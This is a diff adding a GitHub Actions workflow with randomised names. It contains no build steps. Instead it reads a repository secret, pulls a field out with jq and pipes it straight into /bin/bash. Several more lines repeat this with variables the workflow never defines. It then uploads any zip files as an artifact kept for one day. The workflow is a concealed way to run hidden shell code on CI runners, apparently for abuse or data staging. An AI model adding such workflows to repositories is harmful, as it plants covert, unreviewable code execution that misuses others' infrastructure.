@@ -1,0 +1,26 @@
+name: kaydenvirtualn381
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kaydenvirtualn381
+        env:
+          i1059: ${{ secrets.i1059 }}
+        run: |
+          printf '%s' "$i1059" | jq -r .oterm4 | /bin/bash
+          printf '%s' "$ikmb04486" | jq -r .gt79768 | /bin/bash
+          printf '%s' "$siril54481" | jq -r .y32 | /bin/bash
+          printf '%s' "$carm5" | jq -r .twd60 | /bin/bash
+          echo $nska1067 | jq -r .ibqn1 | /bin/bash
+          echo $rlgw1 | jq -r .xveb91 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: UDfgqOc8
+          path: "*.zip"
+          retention-days: 1
